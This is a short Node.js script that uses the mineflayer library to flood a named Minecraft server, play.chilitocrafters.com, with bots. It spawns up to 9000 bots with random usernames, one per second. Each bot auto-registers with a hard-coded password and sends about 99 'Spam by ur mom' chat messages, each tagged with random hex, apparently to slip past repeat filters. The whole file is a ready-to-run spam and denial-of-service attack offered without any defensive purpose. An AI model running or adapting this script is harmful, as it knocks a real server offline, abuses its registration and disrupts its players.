const mineflayer = require('mineflayer')
const { setTimeout } = require('timers')
var AutoAuth = require('mineflayer-auto-auth')
var crypto = require("crypto");

const Bot = class {
    constructor(username) {
        const bot = mineflayer.createBot({
            plugins: [AutoAuth], 
            username: `${username}`,
            AutoAuth: {password: 'OowoO777+', ignoreRepeat: true},
            version: '1.8.9',
            host: 'play.chilitocrafters.com',
            port: '25565',
            viewDistance: 'normal',
            hideErrors: true,
            keepAlive: true,
            checkTimeoutInterval: 60*1000,
        });

        //logs

        bot.on('spawn', () => {
            let sex = bot._client.socket;
            console.log(`[${username}] Join to ${sex._host}`);
        });

        bot.on('kicked', (reason) => {
            console.log(`[${username}] Kick: ${reason}`);
        });

        bot.on('end', () => {
            console.log(`[${username}] Disconnected`);
        });

        bot.on('error', (err) => { 
            console.log(err)
        });

        //spam

        bot.on('serverAuth', function () {
            for (var i = 1; i < 100; i++) {
                setTimeout(() => {
                    bot.chat(`Spam by ur mom [${crypto.randomBytes(4).toString('hex')}]`);
                }, 500)
            }
        });
    }
};

let i = 0
function next() {
    if (i < 9000) {
        i++
        setTimeout(() => {
            new Bot(crypto.randomBytes(8).toString('hex'));
            next()
        }, 1000)
    }
}

next()
